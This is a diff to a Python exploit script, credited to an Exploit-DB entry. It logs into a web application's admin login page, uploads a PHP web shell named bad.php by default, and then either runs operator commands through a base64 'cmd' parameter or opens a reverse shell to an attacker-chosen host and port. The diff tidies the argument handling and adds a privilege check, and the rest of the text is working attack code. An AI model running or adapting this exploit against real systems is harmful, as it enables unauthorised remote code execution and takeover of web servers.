@@ -7,21 +7,28 @@
 # Thanks to Richard Jones (https://www.exploit-db.com/exploits/49445) because I learnt how to upload a nonexistent file with content thanks to his exploit.
 
 from argparse import ArgumentParser,SUPPRESS
-import requests
-import sys
+import requests,sys,ctypes,os
 from base64 import b64encode
 
 def help():
-    print("[+] - There are 2 uses:")
-    print(f"1. Remote code execution: python3 {sys.argv[0]} -rce -ip <targetIp> -u <username> -p <password>")
+    print("There are 2 uses:\n")
+    print(f"1. Remote code execution: python3 {sys.argv[0]} -rce <targetIp> -u <username> -p <password>")
     print(f"2. Reverse shell: python3 {sys.argv[0]} -rs <targetIp> -lh <lhost> -lp <lport> -u <username> -p <password>")
+    print("\n[!] - Additionally, you can add the -file/--filename option to change the uploaded file's name, bad.php by default.")
+
+def AdminPrivs():
+    try:
+        admin = os.getuid() == 0
+    except AttributeError:
+        admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return admin
 
 def executeCode():
     global filename
     global images_url
     print("Ctrl+c to exit")
     while(True):
-        command = input("$")
+        command = input("$ ")
         url = f"{images_url}/{filename}?cmd={b64encode(command.encode()).decode()}"
         rsp = requests.get(url)
         print(rsp.text)
@@ -34,47 +41,54 @@ def sendShell():
     requests.get(url,verify=False)
 
 parser = ArgumentParser(usage=SUPPRESS,add_help=False)
-parser.add_argument('-rce','--rce',action='store_true')
-parser.add_argument('-rs','--rshell',action='store_true')
+parser.add_argument('-rce','--remote')
+parser.add_argument('-rs','--rshell')
 parser.add_argument("-lh","--lhost")
 parser.add_argument("-lp","--lport")
-parser.add_argument("-ip","--ip")
 parser.add_argument("-u","--username")
 parser.add_argument("-p","--password")
-parser.add_argument("-h","--help",action='store_true')
 parser.add_argument("-file","--filename")
+parser.add_argument("-h","--help",action='store_true')
 args = parser.parse_args()
+
+# If no options given, call help and exit
+if (len(sys.argv)==1):
+    help()
+    exit()
 
 # Check if user is asking for help
 if args.help:
     help()
     exit(0)
 
-# If user haven't given remote code execution or reverse shell flag, display help and exit
-if not args.rce and not args.rshell:
-    help()
-    exit(0)
-
+# Establish target ip or call help() and exit the program
 if args.rshell:
     if not args.lhost or not args.lport:
-        help()
+        print("[!] - When choosing reverse shell, listen host and listen port must be given")
         exit(0)
-elif not args.rce:
+    target = args.rshell
+elif args.remote:
+    target = args.remote
+else:
     help()
     exit(0)
 
 # Target ip and login credentials are required
-if not args.ip or not args.username or not args.password:
-    help()
+if not args.username or not args.password:
+    print("[!] - Username and password are required arguments")
     exit(0)
 
 # Give proper variable names
-lhost = args.lhost if args.lhost and not args.rce else None
+lhost = args.lhost if args.lhost else None
 lport = args.lport if args.lport else '4444'
-target = args.ip
 username = args.username
 password = args.password
-filename = args.filename if args.filename else "bad.php"
+filename = "bad.php"
+if args.filename:
+    if args.filename[len(args.filename)-4:] == ".php":
+        filename = args.filename
+    else:
+        filename = args.filename+".php"
 
 # Url's to use
 login_url = f"http://{target}/admin/login.php"
@@ -112,6 +126,9 @@ if args.rshell:
 else:
     payload = rce_payload
 
+if not AdminPrivs():
+    print("[!] - Admin privileges are required, exiting...")
+    exit(0)
 # Create a session so we can log in and do everything needed
 session = requests.Session()
 
@@ -135,7 +152,7 @@ else:
     print("[-] Couldn't upload file")
     exit(0)
 
-if args.rce:
+if args.remote:
     executeCode()
 else:
     sendShell()
